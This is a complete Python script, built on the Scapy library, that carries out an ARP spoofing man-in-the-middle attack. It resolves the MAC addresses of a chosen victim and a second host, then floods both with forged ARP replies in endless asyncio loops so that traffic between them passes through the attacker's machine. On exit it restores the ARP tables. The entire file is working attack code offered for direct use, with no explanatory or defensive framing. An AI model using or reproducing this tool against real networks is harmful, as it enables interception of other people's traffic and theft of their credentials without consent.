#!/usr/bin/env python3

from scapy.arch import get_if_addr, get_if_hwaddr
from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import sendp, srp1
from scapy.layers.l2 import conf

import argparse
import asyncio


class ArgumentParser:

    def __init__(self) -> None:
        """
        Parse arguments (argv).
        """
        # Parser
        self._parser = argparse.ArgumentParser()
        # Src Mac Address
        self._parser.add_argument("--interface", "-i", help="Local interface to communicate with targets", required=False, type=str, default="eth0")
        # Src Ip Address
        self._parser.add_argument("--spoof", "-s", help="Spoof IP", required=True, type=str)
        # Dst Mac Address & Dst Ip Address
        self._parser.add_argument("--victim", "-v", help="Victim IP", required=True, type=str)
        # Args
        self._args = self._parser.parse_args()

        # Each arguments
        self.interface = self._args.interface
        self.spoof_ip = self._args.spoof
        self.victim_ip = self._args.victim


class Spoofing(ArgumentParser):

    ARP_BROADCAST = "ff:ff:ff:ff:ff:ff"
    REQ_RESTORE = 25
    IS_RESTORE = False

    def __init__(self) -> None:
        """
        ARP Spoofing attack
        """
        # Arguments
        super().__init__()
        # Log our information
        self.local_ipv4, self.local_hwmac = self.getLocalInfo()
        print(f"[+] Current IPv4: {self.local_ipv4}, MAC: {self.local_hwmac}")

        # Log spoof information
        self.spoof_hwmac = self.getRemoteMac(self.spoof_ip)
        print(f"[+] Host to Spoof: {self.spoof_ip}, MAC: {self.spoof_hwmac}")

        # Log victim information
        self.victim_hwmac = self.getRemoteMac(self.victim_ip)
        print(f"[+] Victim IPv4: {self.victim_ip}, MAC: {self.victim_hwmac}")


    def getLocalInfo(self) -> tuple:
        """
        Get current interface, @IPv4 and @MAC.
        :returns tuple((str)`local_ipv4`, (str)`local_mac`, )
        """
        local_ipv4 = get_if_addr(self.interface)
        local_mac = get_if_hwaddr(self.interface)

        if local_ipv4 == "0.0.0.0":
            self.interface = conf.iface
            return self.getLocalInfo()
        return local_ipv4, local_mac


    def getRemoteMac(self, ip: str) -> str:
        """
        Launch an who-as to get @MAC from the @IP.
        `ip`: str, IP to get the corresponding MAC.
        :returns (str)`mac`
        """
        res = srp1(Ether(dst=self.ARP_BROADCAST) / ARP(op=0x1, pdst=ip), iface=self.interface, timeout=2, verbose=0)
        return res.payload.hwsrc


    async def spoofVictim(self) -> None:
        """
        Spoof the victim.
        """
        # Create the ARP request
        req_arp_spoof = Ether(dst=self.victim_hwmac, src=self.local_hwmac)/ARP(psrc=self.spoof_ip, hwsrc=self.local_hwmac, pdst=self.victim_ip, hwdst=self.victim_hwmac, op=0x2)

        while True:
            sendp(req_arp_spoof, iface=self.interface, verbose=False)
            # Switch to other function
            await asyncio.sleep(0.01)


    async def spoofTarget(self) -> None:
        """
        Spoof the target.
        """
        # Create the ARP request
        req_arp_spoof = Ether(dst=self.spoof_hwmac, src=self.local_hwmac)/ARP(psrc=self.victim_ip, hwsrc=self.local_hwmac, pdst=self.spoof_ip, hwdst=self.spoof_hwmac, op=0x2)

        while True:
            sendp(req_arp_spoof, iface=self.interface, verbose=False)
            # Switch to other function
            await asyncio.sleep(0.01)


    async def exploit(self) -> None:
        """
        Launch the attack.
        """
        print("[+] Launch the exploit")
        # Thread
        loop = asyncio.get_event_loop()
        victim = loop.create_task(self.spoofVictim())
        target = loop.create_task(self.spoofTarget())

        await asyncio.wait([victim, target])


    def restore(self) -> None:
        """
        Restore the ARP table for all host.
        """
        if self.IS_RESTORE: return
        print("[+] Restore ARP Table")

        # Create the ARP requests
        req_restore_victime = Ether(dst=self.victim_hwmac, src=self.spoof_hwmac)/ARP(psrc=self.spoof_ip, hwsrc=self.spoof_hwmac, pdst=self.victim_ip, hwdst=self.victim_hwmac, op=0x2)
        req_restore_target = Ether(dst=self.spoof_hwmac, src=self.victim_hwmac)/ARP(psrc=self.victim_ip, hwsrc=self.victim_hwmac, pdst=self.spoof_ip, hwdst=self.spoof_hwmac, op=0x2)

        for req in range(self.REQ_RESTORE + 1):
            sendp(req_restore_target, iface=self.interface, verbose=False)
            sendp(req_restore_victime, iface=self.interface, verbose=False)
            print(f"[+] Restore {req}/{self.REQ_RESTORE}", end="\r")

        print()
        self.IS_RESTORE = True


def main(spoofing: Spoofing):
    # Thread asyncio
    loop = asyncio.get_event_loop()

    # Spoof
    loop.run_until_complete(spoofing.exploit())
    loop.close()


if __name__ == "__main__":
    spoofing = Spoofing()
    try:
        main(spoofing)
    except KeyboardInterrupt:
        spoofing.restore()
        exit(0)
    except PermissionError:
        print("[!] You need to be root to launch the script OR have the net capabilities !")
        exit(0)
    finally:
        spoofing.restore()
        exit(0)

